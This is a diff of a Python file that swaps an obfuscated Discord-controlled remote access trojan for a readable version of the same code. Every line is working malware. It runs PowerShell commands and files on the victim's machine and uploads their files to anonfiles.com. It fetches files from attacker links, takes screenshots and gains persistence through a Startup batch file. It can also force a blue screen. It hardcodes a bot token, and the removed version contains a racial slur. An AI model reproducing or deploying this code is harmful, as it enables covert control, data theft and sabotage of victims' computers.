@@ -1,132 +1,141 @@
-import os,discord,subprocess,requests,pyautogui,ctypes,sys
-ޔ=open
-𞹋=int
-𤜼=True
-𬖻=False
-𐳯=file
-棲=sys.argv
-푯=ctypes.byref
-𦣹=ctypes.c_ulong
-𗆭=ctypes.c_bool
-𐣪=ctypes.windll
-ୱ=pyautogui.screenshot
-𬓚=requests.post
-𫆪=requests.get
-𞡬=subprocess.PIPE
-𐬏=subprocess.Popen
-ﭺ=discord.File
-즴=discord.Embed
-ﴀ=discord.Intents
-𣨟=discord.Client
-𢀬=os.path
-ﴹ=os.listdir
-纇=os.chdir
-繋=os.getenv
-ﵼ=os.urandom
-𐬝=os.getlogin
+import os, discord, subprocess, requests, pyautogui, ctypes, sys
 from dotenv import load_dotenv
 load_dotenv()
-䛇=𐬝()
-𝔈=𣨟(intents=ﴀ.all())
-㓐=ﵼ(8).hex()
-𞹙="1396104834901348413"
-𫲶="MTM5OTY4NTAzNzQ5Mzg1MDI1Mg.G5SMBB.sS4C-b6aOTXJ-gtoCZVYgYVYrYTE4yQ8afZCkw"
-𞠝="\n".join(["help - Help Command","ping - Ping Command","cd - Change Directory","ls - List Directory","download <file> - Download File","upload <link> - Upload File","cmd - Execute CMD Command","run <file> - Run an File","screenshot - Take a Screenshot","blue - DeadScreen","startup - Add To Startup","exit - Exit The Session"])
-def 𐤳(file_path=""):
- 𝒀=繋("TEMP")
- ﺭ=r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'%䛇
- if file_path=="":
-  file_path=棲[0]
- with ޔ(ﺭ+'\\'+"Update.bat","w+")as 𨦗:
-  𨦗.write(r'start "" "%s"'%file_path)
-@𝔈.event
-async def 崗():
- ﳆ=𝔈.get_guild(𞹋(𞹙))
- 𐡓=await ﳆ.create_text_channel(㓐)
- 谙=𫆪("https://ipapi.co/json/").json()
- 𞡂=谙['country_name'],谙['ip']
- 𐴇=즴(title="New session created",description="",color=0xfafafa)
- 𐴇.add_field(name="Session ID",value=f"```{session_id}```",inline=𤜼)
- 𐴇.add_field(name="Username",value=f"```{os.getlogin()}```",inline=𤜼)
- 𐴇.add_field(name="IP Address",value=f"```{data}```",inline=𤜼)
- 𐴇.add_field(name="Commands",value=f"```{commands}```",inline=𬖻)
- await 𐡓.send(embed=𐴇)
-@𝔈.event
-async def ࠄ(𐬌):
- if 𐬌.author==𝔈.user:
-  return
- if 𐬌.channel.name!=㓐:
-  return
- if 𐬌.content=="help":
-  𐴇=즴(title="Help",description=f"```{commands}```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content=="ping":
-  𐴇=즴(title="Ping",description=f"```{round(client.latency * 1000)}ms```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("cd"):
-  欱=𐬌.content.split(" ")[1]
-  try:
-   纇(欱)
-   𐴇=즴(title="Changed Directory",description=f"```{os.getcwd()}```",color=0xfafafa)
-  except:
-   𐴇=즴(title="Error",description=f"```Directory Not Found```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content=="ls":
-  𒓂="\n".join(ﴹ())
-  if 𒓂=="":
-   𒓂="No Files Found"
-  𐴇=즴(title=f"Files > {os.getcwd()}",description=f"```{files}```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("download"):
-  𐳯=𐬌.content.split(" ")[1]
-  try:
-   𞢫=𬓚("https://api.anonfiles.com/upload",files={"file":ޔ(𐳯,"rb")}).json()["data"]["file"]["url"]["full"]
-   𐴇=즴(title="Download",description=f"```{link}```",color=0xfafafa)
-   await 𐬌.reply(embed=𐴇)
-  except:
-   𐴇=즴(title="Error",description=f"```File Not Found```",color=0xfafafa)
-   await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("upload"):
-  𞢫=𐬌.content.split(" ")[1]
-  𐳯=𫆪(𞢫).content
-  with ޔ(𢀬.basename(𞢫),"wb")as 끱:
-   끱.write(𐳯)
-  𐴇=즴(title="Upload",description=f"```{os.path.basename(link)}```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("shell"):
-  𞣁=𐬌.content.split(" ",1)[1]
-  𐴚=𐬏(["powershell.exe",𞣁],stdout=𞡬,stderr=𞡬,stdin=𞡬).communicate()[0].decode("utf-8")
-  if 𐴚=="":
-   𐴚="No output"
-  𐴇=즴(title=f"Shell > {os.getcwd()}",description=f"```{output}```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("run"):
-  𐳯=𐬌.content.split(" ")[1]
-  𐬏(𐳯,shell=𤜼)
-  𐴇=즴(title="Started",description=f"```{file}```",color=0xfafafa)
-  await 𐬌.reply(embed=𐴇)
- if 𐬌.content.startswith("exit"):
-  await 𐬌.channel.delete()
-  await 𝔈.close()
- if 𐬌.content.startswith("startup"):
-  await 𐬌.reply("Ok lil Nigga")
-  𐤳()
- if 𐬌.content.startswith("blue"):
-  await 𐬌.reply("Attempting...",delete_after=0.1)
-  𐡅=𐣪.ntdll
-  𪩾=𗆭()
-  𐣪=𦣹()
-  𐡅.RtlAdjustPrivilege(19,𤜼,𬖻,푯(𪩾))
-  if not 𐡅.NtRaiseHardError(0xDEADDEAD,0,0,0,6,푯(𐣪)):
-   await 𐬌.reply("Blue Successful!")
-  else:
-   await 𐬌.reply("Blue Failed! :(")
- if 𐬌.content.startswith("screenshot"):
-  𭽦=ୱ()
-  ﱙ=𢀬.join(繋("TEMP"),"screenshot.png")
-  𭽦.save(ﱙ)
-  𐳯=ﭺ(ﱙ)
-  𐴇=즴(title="Screenshot",color=0xfafafa)
-  𐴇.set_image(url="attachment://screenshot.png")
-  await 𐬌.reply(embed=𐴇,𐳯=𐳯)
-𝔈.run(𫲶)
+
+login = os.getlogin()
+client = discord.Client(intents=discord.Intents.all())
+session_id = os.urandom(8).hex()
+guild_id = "1396104834901348413"
+token = "MTM5OTY4NTAzNzQ5Mzg1MDI1Mg.G5SMBB.sS4C-b6aOTXJ-gtoCZVYgYVYrYTE4yQ8afZCkw"
+
+commands = "\n".join([
+    "help - Help Command",
+    "ping - Ping Command",
+    "cd - Change Directory",
+    "ls - List Directory",
+    "download <file> - Download File",
+    "upload <link> - Upload File",
+    "cmd - Execute CMD Command",
+    "run <file> - Run an File",
+    "screenshot - Take a Screenshot",
+    "blue - DeadScreen",
+    "startup - Add To Startup",
+    "exit - Exit The Session"
+])
+
+def startup(file_path=""):
+    temp = os.getenv("TEMP")
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
+    if file_path == "":
+        file_path = sys.argv[0]
+    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
+        bat_file.write(r'start "" "%s"' % file_path)
+
+@client.event
+async def on_ready():
+    guild = client.get_guild(int(guild_id))
+    channel = await guild.create_text_channel(session_id)
+    ip_address = requests.get("https://ipapi.co/json/").json()
+    data = ip_address['country_name'], ip_address['ip']
+    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
+    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
+    embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
+    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+    await channel.send(embed=embed)
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    if message.channel.name != session_id:
+        return
+
+    if message.content == "help":
+        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content == "ping":
+        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("cd"):
+        directory = message.content.split(" ")[1]
+        try:
+            os.chdir(directory)
+            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
+        except:
+            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content == "ls":
+        files = "\n".join(os.listdir())
+        if files == "":
+            files = "No Files Found"
+        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("download"):
+        file = message.content.split(" ")[1]
+        try:
+            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
+            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
+            await message.reply(embed=embed)
+        except:
+            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
+            await message.reply(embed=embed)
+
+    if message.content.startswith("upload"):
+        link = message.content.split(" ")[1]
+        file = requests.get(link).content
+        with open(os.path.basename(link), "wb") as f:
+            f.write(file)
+        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("shell"):
+        command = message.content.split(" ", 1)[1]
+        output = subprocess.Popen(
+            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+        ).communicate()[0].decode("utf-8")
+        if output == "":
+            output = "No output"
+        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("run"):
+        file = message.content.split(" ")[1]
+        subprocess.Popen(file, shell=True)
+        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("exit"):
+        await message.channel.delete()
+        await client.close()
+
+    if message.content.startswith("startup"):
+        await message.reply("Ok Boss")
+        startup()
+
+    if message.content.startswith("blue"):
+        await message.reply("Attempting...", delete_after=0.1)
+        ntdll = ctypes.windll.ntdll
+        prev_value = ctypes.c_bool()
+        res = ctypes.c_ulong()
+        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+            await message.reply("Blue Successful!")
+        else:
+            await message.reply("Blue Failed! :(")
+
+    if message.content.startswith("screenshot"):
+        screenshot = pyautogui.screenshot()
+        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+        screenshot.save(path)
+        file = discord.File(path)
+        embed = discord.Embed(title="Screenshot", color=0xfafafa)
+        embed.set_image(url="attachment://screenshot.png")
+        await message.reply(embed=embed, file=file)
+
+client.run(token)
